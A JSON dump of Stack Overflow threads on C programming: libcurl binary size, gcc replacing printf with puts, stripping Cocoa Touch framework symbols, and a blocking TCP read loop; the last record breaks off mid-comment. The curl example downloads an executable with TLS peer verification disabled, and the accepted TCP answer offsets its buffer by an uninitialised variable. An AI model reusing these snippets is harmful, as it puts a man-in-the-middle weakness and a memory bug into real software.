[{"tags": ["c", "http", "curl", "https"], "comments": [{"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 1, "creation_date": 1482983038, "post_id": 41371059, "comment_id": 69947409, "body": "have you tried dynamic linking to a dll instead of static linking the entire binary?"}, {"owner": {"reputation": 109, "user_id": 5672875, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/1fe6821e42e3cbfd7000ee144cf605b1?s=128&d=identicon&r=PG&f=1", "display_name": "MrWhite", "link": "https://stackoverflow.com/users/5672875/mrwhite"}, "reply_to_user": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 0, "creation_date": 1483006014, "post_id": 41371059, "comment_id": 69956531, "body": "It has to be linked static."}, {"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 0, "creation_date": 1483036895, "post_id": 41371059, "comment_id": 69973026, "body": "In that case, you have to recompile curl yourself.  When you do a static link, the linker will bring in the entire static library and bind it into the executable."}], "answers": [{"comments": [{"owner": {"reputation": 109, "user_id": 5672875, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/1fe6821e42e3cbfd7000ee144cf605b1?s=128&d=identicon&r=PG&f=1", "display_name": "MrWhite", "link": "https://stackoverflow.com/users/5672875/mrwhite"}, "edited": false, "score": 0, "creation_date": 1483006110, "post_id": 41373434, "comment_id": 69956573, "body": "I compiled it in release mode. How can I configure curl while compiling it to only use HTTP/S feature?"}, {"owner": {"reputation": 43751, "user_id": 93747, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dbf187b5b45c400649ed7f946e8f00d6?s=128&d=identicon&r=PG", "display_name": "Daniel Stenberg", "link": "https://stackoverflow.com/users/93747/daniel-stenberg"}, "edited": false, "score": 0, "creation_date": 1483009141, "post_id": 41373434, "comment_id": 69958301, "body": "<a href=\"https://github.com/curl/curl/blob/master/docs/INSTALL.md#disabling-specific-protocols-in-windows-builds\" rel=\"nofollow noreferrer\">As documented?</a>"}], "tags": [], "owner": {"reputation": 1667, "user_id": 4490542, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/8925b87f1bc4c6a3bc6956628c9d3b6f?s=128&d=identicon&r=PG&f=1", "display_name": "e.jahandar", "link": "https://stackoverflow.com/users/4490542/e-jahandar"}, "is_accepted": false, "score": 1, "last_activity_date": 1482987966, "creation_date": 1482987966, "answer_id": 41373434, "question_id": 41371059, "link": "https://stackoverflow.com/questions/41371059/exe-very-large-when-curl-is-linked/41373434#41373434", "title": "exe very large when curl is linked", "body": "<ol>\n<li>Compile your application in release mode and turn on all strips, compiling an application in release mode will reduce its size due to removal of debugging symbols</li>\n<li>You have to compile libcurl yourself and configure it. configuring a library could be a little tricky, but it worth, you can fully customize it so disabling unused features let you reduce library size, also don't remember to compile curl without debugging informations.</li>\n<li>compile all staffs with different optimization flags, say -Os is preferable but you should check with other optimization levels to verify.</li>\n<li>use shared libraries as much as possible</li>\n</ol>\n"}], "owner": {"reputation": 109, "user_id": 5672875, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/1fe6821e42e3cbfd7000ee144cf605b1?s=128&d=identicon&r=PG&f=1", "display_name": "MrWhite", "link": "https://stackoverflow.com/users/5672875/mrwhite"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 126, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1482987966, "creation_date": 1482967124, "last_edit_date": 1482967266, "question_id": 41371059, "link": "https://stackoverflow.com/questions/41371059/exe-very-large-when-curl-is-linked", "title": "exe very large when curl is linked", "body": "<p>I have downloaded a compiled curl for Windows (the .a files) and linked it to my project. The problem is, the compiled .exe is very large (2,41MB) just for this simple program:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;curl/curl.h&gt;\n\nsize_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {\n    size_t written = fwrite(ptr, size, nmemb, stream);\n    return written;\n}\nint main(void)\n{\n    CURL *curl;\n    FILE *fp;\n    CURLcode res;\n    char *url = \"https://website/app.exe\";\n    char outfilename[FILENAME_MAX] = \"file.exe\";\n    curl = curl_easy_init();\n    if (curl) {\n        fp = fopen(outfilename,\"wb\");\n        curl_easy_setopt(curl, CURLOPT_URL, url);\n        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);\n        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);\n        res = curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n        fclose(fp);\n    }\n  return 0;\n}\n</code></pre>\n\n<p>Now, I assume that is because curl I have linked to my project has many functions enabled in itself/contains many functions which I don't need. Is there any way to enable only HTTPS (and HTTP by that?) and with that make the program size smaller? I have found something like that on the curl website (<a href=\"https://curl.haxx.se/docs/install.html\" rel=\"nofollow noreferrer\">https://curl.haxx.se/docs/install.html</a> - Disabling Specific Protocols in Windows builds), but I didn't quite understand what should I do. I tried putting the \"HTTP_ONLY\" in \"defines\" in CodeBlocks but it did nothing. Probably curl has to be compiled somehow with that option. What can I do?\nAny help is appreciated, thank you!</p>\n"}, {"tags": ["c", "assembly", "printf", "compiler-optimization", "puts"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 4, "creation_date": 1482966828, "post_id": 41371002, "comment_id": 69943729, "body": "GNU <code>gcc</code> thinks it is a good idea to replace <code>printf(&quot;some string\\n&quot;)</code> with <code>puts(&quot;some string&quot;);</code> \u2014 so it does.  It&#39;s an optimization; <code>puts()</code> doesn&#39;t have to interpret the format string."}, {"owner": {"reputation": 52633, "user_id": 3155639, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/d254eedd932f950213109aa3706aba74?s=128&d=identicon&r=PG", "display_name": "Alexander O&#39;Mara", "link": "https://stackoverflow.com/users/3155639/alexander-omara"}, "edited": false, "score": 1, "creation_date": 1482966904, "post_id": 41371002, "comment_id": 69943752, "body": "Related: <a href=\"https://stackoverflow.com/questions/25816659/can-printf-get-replaced-by-puts-automatically-in-a-c-program\">Can printf get replaced by puts automatically in a C program?</a>"}, {"owner": {"reputation": 23, "user_id": 7343090, "user_type": "registered", "profile_image": "https://graph.facebook.com/1365820023437260/picture?type=large", "display_name": "l1on_coding", "link": "https://stackoverflow.com/users/7343090/l1on-coding"}, "edited": false, "score": 0, "creation_date": 1482967171, "post_id": 41371002, "comment_id": 69943833, "body": "Ok thanks for help! :)"}, {"owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 0, "creation_date": 1482968801, "post_id": 41371002, "comment_id": 69944321, "body": "Be aware that compilers can modify and replace <i>any</i> of the standard C library. It&#39;s common to rewrite the memory and string functions like <code>memset</code>, <code>memcpy</code> and <code>strlen</code> for example."}, {"owner": {"reputation": 41564, "user_id": 3857942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hXLnN.jpg?s=128&g=1", "display_name": "Michael Petch", "link": "https://stackoverflow.com/users/3857942/michael-petch"}, "edited": false, "score": 0, "creation_date": 1482969782, "post_id": 41371002, "comment_id": 69944627, "body": "Another question/answer that may be of value: <a href=\"http://stackoverflow.com/questions/37435984/why-doesnt-gcc-optimize-this-call-to-printf\" title=\"why doesnt gcc optimize this call to printf\">stackoverflow.com/questions/37435984/&hellip;</a>"}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 1, "creation_date": 1482978326, "post_id": 41371002, "comment_id": 69946397, "body": "That&#39;s interesting, I wouldn&#39;t have guessed that gcc would do this optimization at <code>-O0</code>.  (But note that <code>gcc -O0</code> doesn&#39;t mean literal braindead translation of source to asm: <a href=\"http://stackoverflow.com/questions/33278757/disable-all-optimization-options-in-gcc/33284629#33284629\" title=\"disable all optimization options in gcc\">stackoverflow.com/questions/33278757/&hellip;</a>)"}], "answers": [{"tags": [], "owner": {"reputation": 34922, "user_id": 586873, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/11ba1f932f0af556969448ffba230d9a?s=128&d=identicon&r=PG", "display_name": "Grzegorz Szpetkowski", "link": "https://stackoverflow.com/users/586873/grzegorz-szpetkowski"}, "is_accepted": true, "score": 2, "last_activity_date": 1482972357, "last_edit_date": 1482972357, "creation_date": 1482967655, "answer_id": 41371129, "question_id": 41371002, "link": "https://stackoverflow.com/questions/41371002/why-it-shows-puts-when-i-disassemble-no-matter-whether-im-using-printf-or-puts/41371129#41371129", "title": "Why it shows puts when I disassemble no matter whether I&#39;m using printf or puts?", "body": "<p>The <code>puts</code> function is preferred because it is simpler to in both functionality (no format string decoding) and argument passing.</p>\n\n<p>For instance, System V ABI x86 calling conventions require to set number of XMM (YMM) arguments (<code>printf</code> is variadic) in <code>RAX</code>. <code>puts</code> is easier, as there is only single argument passed with <code>RDI</code>.</p>\n"}], "owner": {"reputation": 23, "user_id": 7343090, "user_type": "registered", "profile_image": "https://graph.facebook.com/1365820023437260/picture?type=large", "display_name": "l1on_coding", "link": "https://stackoverflow.com/users/7343090/l1on-coding"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 366, "favorite_count": 1, "closed_date": 1580923575, "accepted_answer_id": 41371129, "answer_count": 1, "score": 2, "last_activity_date": 1483011746, "creation_date": 1482966726, "last_edit_date": 1483011746, "question_id": 41371002, "link": "https://stackoverflow.com/questions/41371002/why-it-shows-puts-when-i-disassemble-no-matter-whether-im-using-printf-or-puts", "closed_reason": "Duplicate", "title": "Why it shows puts when I disassemble no matter whether I&#39;m using printf or puts?", "body": "<p>I'm pretty new to programming and wanted to ask why I get the same result with different code. I'm actually reading a book and the example in the book is with printf (also in Assembler). In this case it says <code>&lt;printf@plt&gt;</code>. The assembler code in the book differs from mine but C Code is the same. Is my processor just computing different?</p>\n\n<p>(Problem is at call <code>&lt;+34&gt;</code> <code>&lt;puts@plt&gt;</code>)</p>\n\n<p>Code 1:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int i;\n    for(i=0; i&lt;10; i++)\n    {\n        printf(\"Hello, world!\\n\");\n    }\n    return 0;\n}\n</code></pre>\n\n<p>Code 2:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int i;\n    for(i=0; i&lt;10; i++)\n    {\n        puts(\"Hello, world!\\n\");\n    }\n    return 0;\n}\n</code></pre>\n\n<p>Code 1 disassembled:</p>\n\n<pre><code>Dump of assembler code for function main:\n   0x080483eb &lt;+0&gt;: lea    ecx,[esp+0x4]\n   0x080483ef &lt;+4&gt;: and    esp,0xfffffff0\n   0x080483f2 &lt;+7&gt;: push   DWORD PTR [ecx-0x4]\n   0x080483f5 &lt;+10&gt;:    push   ebp\n   0x080483f6 &lt;+11&gt;:    mov    ebp,esp\n   0x080483f8 &lt;+13&gt;:    push   ecx\n=&gt; 0x080483f9 &lt;+14&gt;:    sub    esp,0x14\n   0x080483fc &lt;+17&gt;:    mov    DWORD PTR [ebp-0xc],0x0\n   0x08048403 &lt;+24&gt;:    jmp    0x8048419 &lt;main+46&gt;\n   0x08048405 &lt;+26&gt;:    sub    esp,0xc\n   0x08048408 &lt;+29&gt;:    push   0x80484b0\n   0x0804840d &lt;+34&gt;:    call   0x80482c0 &lt;puts@plt&gt;\n   0x08048412 &lt;+39&gt;:    add    esp,0x10\n   0x08048415 &lt;+42&gt;:    add    DWORD PTR [ebp-0xc],0x1\n   0x08048419 &lt;+46&gt;:    cmp    DWORD PTR [ebp-0xc],0x9\n   0x0804841d &lt;+50&gt;:    jle    0x8048405 &lt;main+26&gt;\n   0x0804841f &lt;+52&gt;:    mov    eax,0x0\n   0x08048424 &lt;+57&gt;:    mov    ecx,DWORD PTR [ebp-0x4]\n   0x08048427 &lt;+60&gt;:    leave  \n   0x08048428 &lt;+61&gt;:    lea    esp,[ecx-0x4]\n   0x0804842b &lt;+64&gt;:    ret    \nEnd of assembler dump.\n</code></pre>\n\n<p>Code 2 disassembled:</p>\n\n<pre><code>Dump of assembler code for function main:\n   0x080483eb &lt;+0&gt;: lea    ecx,[esp+0x4]\n   0x080483ef &lt;+4&gt;: and    esp,0xfffffff0\n   0x080483f2 &lt;+7&gt;: push   DWORD PTR [ecx-0x4]\n   0x080483f5 &lt;+10&gt;:    push   ebp\n   0x080483f6 &lt;+11&gt;:    mov    ebp,esp\n   0x080483f8 &lt;+13&gt;:    push   ecx\n   0x080483f9 &lt;+14&gt;:    sub    esp,0x14\n   0x080483fc &lt;+17&gt;:    mov    DWORD PTR [ebp-0xc],0x0\n   0x08048403 &lt;+24&gt;:    jmp    0x8048419 &lt;main+46&gt;\n=&gt; 0x08048405 &lt;+26&gt;:    sub    esp,0xc\n   0x08048408 &lt;+29&gt;:    push   0x80484b0\n   0x0804840d &lt;+34&gt;:    call   0x80482c0 &lt;puts@plt&gt;\n   0x08048412 &lt;+39&gt;:    add    esp,0x10\n   0x08048415 &lt;+42&gt;:    add    DWORD PTR [ebp-0xc],0x1\n   0x08048419 &lt;+46&gt;:    cmp    DWORD PTR [ebp-0xc],0x9\n   0x0804841d &lt;+50&gt;:    jle    0x8048405 &lt;main+26&gt;\n   0x0804841f &lt;+52&gt;:    mov    eax,0x0\n   0x08048424 &lt;+57&gt;:    mov    ecx,DWORD PTR [ebp-0x4]\n   0x08048427 &lt;+60&gt;:    leave  \n   0x08048428 &lt;+61&gt;:    lea    esp,[ecx-0x4]\n   0x0804842b &lt;+64&gt;:    ret    \nEnd of assembler dump.\n</code></pre>\n"}, {"tags": ["ios", "c", "xcode", "gcc", "ios-frameworks"], "answers": [{"tags": [], "owner": {"reputation": 6668, "user_id": 1197719, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/a11ff3ed53b29c71863d5e0f740e9c1d?s=128&d=identicon&r=PG", "display_name": "Andreas", "link": "https://stackoverflow.com/users/1197719/andreas"}, "is_accepted": true, "score": 3, "last_activity_date": 1483980093, "creation_date": 1483980093, "answer_id": 41552741, "question_id": 41370990, "link": "https://stackoverflow.com/questions/41370990/how-to-strip-cocoa-touch-frameworks/41552741#41552741", "title": "How to strip Cocoa Touch Frameworks", "body": "<p>To answer my own question: It's impossible to use the strip style \"All Symbols\" with Cocoa Touch Frameworks because relocatable dynamic libraries (which Cocoa Touch Frameworks basically are) which reference external symbols like <code>printf</code> need an indirect symbol table which won't be there if \"Strip Style\" is set to \"All Symbols\".</p>\n\n<p>Thus, \"Strip Style\" should simply be set to \"Non-Global Symbols\". The naming is a bit confusing here because \"Non-Global Symbols\" sounds as if <code>strip</code> didn't strip symbols like <code>mytestsymbol</code> in the code above (because it is a global symbol) but in fact it does strip it. So just using the \"Non-Global Symbols\" strip style works perfectly. </p>\n"}], "owner": {"reputation": 6668, "user_id": 1197719, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/a11ff3ed53b29c71863d5e0f740e9c1d?s=128&d=identicon&r=PG", "display_name": "Andreas", "link": "https://stackoverflow.com/users/1197719/andreas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 755, "favorite_count": 0, "accepted_answer_id": 41552741, "answer_count": 1, "score": 0, "last_activity_date": 1483980093, "creation_date": 1482966613, "question_id": 41370990, "link": "https://stackoverflow.com/questions/41370990/how-to-strip-cocoa-touch-frameworks", "title": "How to strip Cocoa Touch Frameworks", "body": "<p>I have a Cocoa Touch framework which consists of 99.9% pure C code with just a tiny layer of Objective C on top of it. The framework should just export a single symbol named <code>mytestsymbol</code>. To do this, I create an exported symbols file that contains just this line:</p>\n\n<pre><code>_mytestsymbol\n</code></pre>\n\n<p>I then tell the linker to use this file by adding it to the \"Exported Symbols File\" entry in \"Build Settings/Linking\" in Xcode.</p>\n\n<p>In terms of C code, <code>mytestsymbol</code> looks like this:</p>\n\n<pre><code>void mytestsymbol(void)\n{\n    start_the_whole_shebang();\n}\n</code></pre>\n\n<p>However, when building the framework and examining the executable's contents using a hex editor I can see that pretty much all global symbols defined in my C sources are still there but I don't want to expose those!</p>\n\n<p>When checking the stripping options of the Cocoa Touch framework in Xcode I can see that by default this is just set to \"Debugging symbols\" whereas when building apps it is set to \"All symbols\" by default. So I changed the \"Strip style\" mode to \"All symbols\" for my framework and tried to archive it.</p>\n\n<p>However, that doesn't work either. Now <code>strip</code> returns the following error when archiving the project:</p>\n\n<pre><code>Symbols referenced by indirect symbol table entries that can't be stripped in: ...\n</code></pre>\n\n<p>Then a list of symbols follows. Those are all symbols my framework imports from other frameworks, e.g. stuff from the C runtime like <code>printf</code>, <code>fopen</code>, etc but also stuff from Apple frameworks like <code>CFBundleCopyBundleURL</code> and so on.</p>\n\n<p>So I think I get this error because <code>strip</code> tries to strip those symbols but this is of course forbidden because those are needed by my framework.</p>\n\n<p>So how can I tell Xcode to strip <em>only</em> the global symbols defined by my framework (except <code>mytestsymbol</code>) and not any other imports from other frameworks? Currently, it doesn't seem possible to set the stripping style to \"All symbols\" for Cocoa Touch Frameworks at all. Whenever this is set to \"All symbols\", <code>strip</code> (which is invoked by Xcode) always returns the following error:</p>\n\n<pre><code>Symbols referenced by indirect symbol table entries that can't be stripped in: ...\n</code></pre>\n\n<p>Note that I'm talking about stripping global C symbols only. I know that Objective C can't be stripped like C but that's fine with me. I'm really only concerned about the C symbols. I want all C globals to be stripped <em>except</em> the symbol named <code>mytestsymbol</code>.</p>\n\n<p>Any ideas?</p>\n"}, {"tags": ["c", "tcp"], "comments": [{"owner": {"reputation": 1047, "user_id": 3114851, "user_type": "registered", "accept_rate": 52, "profile_image": "https://graph.facebook.com/1820208914/picture?type=large", "display_name": "Tomasz Kasperek", "link": "https://stackoverflow.com/users/3114851/tomasz-kasperek"}, "edited": false, "score": 0, "creation_date": 1482964973, "post_id": 41370694, "comment_id": 69943183, "body": "@Barmar my mistake, I didn&#39;t have it in my real code"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1482965006, "post_id": 41370694, "comment_id": 69943195, "body": "Have you tried doing a packet capture to see if the message is being sent to the server?"}, {"owner": {"reputation": 1047, "user_id": 3114851, "user_type": "registered", "accept_rate": 52, "profile_image": "https://graph.facebook.com/1820208914/picture?type=large", "display_name": "Tomasz Kasperek", "link": "https://stackoverflow.com/users/3114851/tomasz-kasperek"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1482965094, "post_id": 41370694, "comment_id": 69943226, "body": "@Barmar what is interesting when I first run a server, then client and it hangs, but after that I kill client process with CTRL + C the server seems to get the message just right, but not until client process is alive"}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1482965096, "post_id": 41370694, "comment_id": 69943228, "body": "Your server code does nothing but wait for requests. Have you considered sending the file that was asked for?"}, {"owner": {"reputation": 1047, "user_id": 3114851, "user_type": "registered", "accept_rate": 52, "profile_image": "https://graph.facebook.com/1820208914/picture?type=large", "display_name": "Tomasz Kasperek", "link": "https://stackoverflow.com/users/3114851/tomasz-kasperek"}, "reply_to_user": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1482965165, "post_id": 41370694, "comment_id": 69943248, "body": "@EJP this code I posted here is not complete. I am sending file later"}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1482965239, "post_id": 41370694, "comment_id": 69943277, "body": "So your question is utterly pointless. You need to send the file immediately after the MC_ACCEPT, not &#39;later&#39;. There is no later. You&#39;re stuck in this loop."}], "answers": [{"comments": [{"owner": {"reputation": 1047, "user_id": 3114851, "user_type": "registered", "accept_rate": 52, "profile_image": "https://graph.facebook.com/1820208914/picture?type=large", "display_name": "Tomasz Kasperek", "link": "https://stackoverflow.com/users/3114851/tomasz-kasperek"}, "edited": false, "score": 0, "creation_date": 1483014872, "post_id": 41370756, "comment_id": 69961397, "body": "Your explanation was a key to understand my problem. Thank you."}], "tags": [], "owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "is_accepted": true, "score": 1, "last_activity_date": 1483001449, "last_edit_date": 1483001449, "creation_date": 1482964918, "answer_id": 41370756, "question_id": 41370694, "link": "https://stackoverflow.com/questions/41370694/tcp-socket-read-write-freezes-server/41370756#41370756", "title": "TCP socket read/write freezes server", "body": "<p>On the server side:</p>\n\n<pre><code>char response[128];\nint bytes_read;\nwhile ((bytes_read = read(info.socket, response, 128)) &gt; 0) {}\n</code></pre>\n\n<p>You try to read those 128 chars in several <code>read</code> calls. But it will block forever until client closes the socket (it's TCP connected, there's always something to read unless peer closes connection).</p>\n\n<p>And if the data arrives in more than 1 chunk, your code is incorrect, because the first chunk will be overwritten by the next one, and so on. You have to change the offset of your buffer, and do not attempt to read 128 bytes every time, or you'll get stuck.</p>\n\n<pre><code>int bytes_read = 0;\nwhile (bytes_read &lt; 128)\n{\n  int currently_read = read(info.socket, response + currently_read, 128-bytes_read);\n  bytes_read += currently_read;\n}\n</code></pre>\n\n<p>On the client side, same kind of issues too:</p>\n\n<p>You seem to wait for 4 chars.</p>\n\n<p>You try to read those 4 chars in the first <code>read</code>. But you don't check if 4 chars are actually read (return code discarded).</p>\n\n<p>After that, you read using a loop until you get 0 bytes. But since connection doesn't end, you're stuck there.</p>\n\n<p>What you want is to read exactly 4 bytes before doing something else.</p>\n\n<p>And increase your buffer size &amp; null-terminate your string or <code>strcmp</code> will fail.</p>\n\n<pre><code>char status[5];\nstatus[4] = '\\0';\nint nb_read = 0;\nwhile (nb_read &lt; 4)\n{\n  int currently_read = read(sck, status + nb_read, 4-nb_read);\n  nb_read += currently_read;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1483001529, "post_id": 41370846, "comment_id": 69953928, "body": "but cannot <code>read(info.socket, response, sizeof response -1)</code> return less than <code>sizeof response -1</code> ?"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1483026994, "post_id": 41370846, "comment_id": 69968104, "body": "Yes, it can. He actually needs to design the protocol so that there&#39;s some way for the server to tell where the request ends, either with a length prefix or a delimiter character, then keep reading until he gets the whole message. Without this, the best he can do is hope that <code>read()</code> will return the whole message, which is reasonably likely."}], "tags": [], "owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "is_accepted": false, "score": 0, "last_activity_date": 1482965513, "creation_date": 1482965513, "answer_id": 41370846, "question_id": 41370694, "link": "https://stackoverflow.com/questions/41370694/tcp-socket-read-write-freezes-server/41370846#41370846", "title": "TCP socket read/write freezes server", "body": "<p>The problem is that you're not processing the request inside the <code>while</code> loop:</p>\n\n<pre><code>while ((bytes_read = read(info.socket, response, 128)) &gt; 0) {}\n</code></pre>\n\n<p>This keeps looping until <code>read()</code> returns <code>0</code>, which happens when the client closes the connection, or gets an error and returns <code>-1</code>. After it reads the request from the client, it goes back and calls <code>read()</code> again. Since the client hasn't sent anything else, this blocks.</p>\n\n<p>This is why killing the client gets it unstuck. That closes the connection, so it gets EOF and <code>read()</code> returns <code>0</code>.</p>\n\n<p>You need to process the input inside the loop:</p>\n\n<pre><code>while ((bytes_read = read(info.socket, response, sizeof response -1)) &gt; 0) {\n    response[bytes_read] = '\\0'; // add string null terminator\n    if (valid_request(files, files_count, response)) {\n        write(info.socket, MC_ACCEPT, 4);\n    } else {\n        write(info.socket, MC_FAILURE, 4);\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 1047, "user_id": 3114851, "user_type": "registered", "accept_rate": 52, "profile_image": "https://graph.facebook.com/1820208914/picture?type=large", "display_name": "Tomasz Kasperek", "link": "https://stackoverflow.com/users/3114851/tomasz-kasperek"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 483, "favorite_count": 0, "accepted_answer_id": 41370756, "answer_count": 2, "score": 0, "last_activity_date": 1483001449, "creation_date": 1482964527, "last_edit_date": 1482964924, "question_id": 41370694, "link": "https://stackoverflow.com/questions/41370694/tcp-socket-read-write-freezes-server", "title": "TCP socket read/write freezes server", "body": "<p>I want to implement protocol using TCP sockets in C which works kind of this way:</p>\n\n<ol>\n<li>Client connects to server and sends filename that it wants to\ndownload</li>\n<li>Server reads that value and checks whether it is valid filename (does it exist on the server) + sends <code>ACCEPT</code> or <code>FAILURE</code> status to client</li>\n<li>Client reads that status and prepares itself to download + sends <code>READY</code> status to server</li>\n<li>Server sends file and closes connection</li>\n</ol>\n\n<p><strong>Server code</strong>:</p>\n\n<pre><code>char response[128];\nint bytes_read;\nwhile ((bytes_read = read(info.socket, response, 128)) &gt; 0) {}\n\nif (valid_request(files, files_count, response)) {\n    write(info.socket, MC_ACCEPT, 4);\n} else {\n    write(info.socket, MC_FAILURE, 4);\n}\n</code></pre>\n\n<p><strong>Client code</strong>:</p>\n\n<pre><code>int w_status = write(sck, requested_file, strlen(requested_file));\nif (w_status &lt; 0) {\n    fprintf(stderr, \"Error writing to socket. Status: %d\", w_status);\n    exit(1);\n}\n\nchar status[4];\nwhile ((resp = read(sck, status, 4)) &gt; 0) {}\n\nif (strcmp(status, MC_ACCEPT) == 0) {\n    printf(\"ACCEPTED!\\n\");\n} else if (strcmp(status, MC_ACCEPT) == 0) {\n    printf(\"FAILURE\\n\");\n} else {\n    printf(\"DONT KNOW\\n\");\n}\n\nclose(sck);\n</code></pre>\n\n<p>The problem is that server freezes itself on the <code>read()</code> part. It looks like client sends the filename and waits for server response (with status) but server is frozen at <code>read()</code>.</p>\n\n<p>Am I somehow blocking the TCP socket? What is wrong with my reasoning?</p>\n"}, {"tags": ["c", "algorithm"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1482966116, "post_id": 